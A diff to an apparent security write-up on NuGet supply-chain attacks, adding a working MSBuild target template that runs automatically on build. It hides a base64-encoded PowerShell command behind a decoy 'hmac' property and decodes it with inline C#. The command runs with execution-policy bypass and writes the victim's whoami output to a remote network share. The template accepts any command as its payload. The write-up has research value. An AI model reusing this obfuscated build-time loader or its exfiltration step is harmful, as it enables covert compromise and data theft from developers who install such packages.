@@ -111,6 +111,39 @@ So as of writting this there is no way to execute during the nuget package insta
 So targets are used for additional build operations that trigger off defined events. It just so happens there is a <b>exec</b> task that is built in. Whats also worth noting is that within target files you can define variables as well as write C# code to execute. 
 So the attack now triggers upon a build event - which in the case of restoring a package will be the most probablistic action following a restore.
 
+<pre>
+    <code>
+    </code>
+</pre>
+
+<pre>
+    <code>
+    <Project>
+  <PropertyGroup>   
+    <hmac>cG93ZXJzaGVsbCAtTm9Qcm9maWxlIOKAk0V4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiR1c2VyID0gJiB3aG9hbWk7QWRkLUNvbnRlbnQgLy9HUjA1OTYxOS9sb2cvbG9nLnR4dCAkdXNlciIK</hmac>    
+  </PropertyGroup> 
+  <UsingTask TaskName="ToBase64" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup>
+      <In ParameterType="System.String" Required="true" />
+      <Out ParameterType="System.String" Output="true" />
+    </ParameterGroup>
+    <Task>
+      <Code Type="Fragment" Language="cs">
+      Out = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(In));
+    </Code>
+    </Task>
+  </UsingTask>
+  <Target Name="SetACL" BeforeTargets="PreBuildEvent">
+    <!--Execute code-->
+    <ToBase64 In="$(hmac)">
+      <Output PropertyName="hmacValidation" TaskParameter="Out" />
+    </ToBase64>
+    <Exec Command="$(hmacValidation)" />
+  </Target>    
+</Project>
+    </code>
+</pre>
+
 <h3>Finding vulnerable projects</h3>
 <h4>Non targeted</h4>
 <p>
